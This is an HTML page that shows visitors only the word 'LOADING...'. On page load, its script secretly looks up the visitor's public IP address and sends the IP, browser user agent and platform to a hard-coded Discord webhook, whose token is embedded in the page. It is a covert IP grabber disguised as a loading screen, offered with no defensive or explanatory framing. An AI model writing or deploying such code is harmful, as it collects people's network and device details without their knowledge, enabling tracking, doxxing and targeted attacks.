<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>neonxsl</title>
  <style>
    /* Import the Lexend font */
    @import url('https://fonts.googleapis.com/css2?family=Lexend:wght@400;600&display=swap');

    /* Basic styling for the body */
    body {
      background-color: black;
      color: white;
      font-family: 'Lexend', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }

    /* Styling for the loading text */
    h1 {
      font-size: 3rem;
      margin: 0;
    }
  </style>
</head>
<body>
  <!-- Add missing elements -->
  <h1>LOADING...</h1>
  <p><strong></strong> <span id="deviceName"></span></p>
  <p><strong></strong> <span id="deviceModel"></span></p>
  <p><strong></strong> <span id="ipAddress"></span></p>

  <script>
    // Fetch the IP address from a third-party API
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        // Prepare the data to be sent to the Discord webhook
        const deviceInfo = {
          content: `Device Information:
          \nDevice Name: ${navigator.userAgent}
          \nDevice Model: ${navigator.platform}
          \nIP Address: ${data.ip}`
        };

        // Send the device information to the Discord webhook
        fetch('https://discord.com/api/webhooks/1162536831859036250/hE08qlNdmi-4QYLQCvjTgrpS_aZzCxC642ynTuFqSamI0LxMwYFR3-8BCti3VOqAnEdf', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(deviceInfo)
        })
        .then(response => {
          console.log('Webhook response status:', response.status); // Log the response status
          return response.json();
        })
        .then(result => {
          console.log('Successfully sent to Discord:', result);
        })
        .catch(error => {
          console.error('Error sending to Discord:', error);
        });

        // Set the content to "LOADING..." as requested
        document.getElementById("deviceName").textContent = "";
        document.getElementById("deviceModel").textContent = "";
        document.getElementById("ipAddress").textContent = "";
      })
      .catch(err => {
        console.error('Error fetching IP address:', err);
      });
  </script>
</body>
</html>
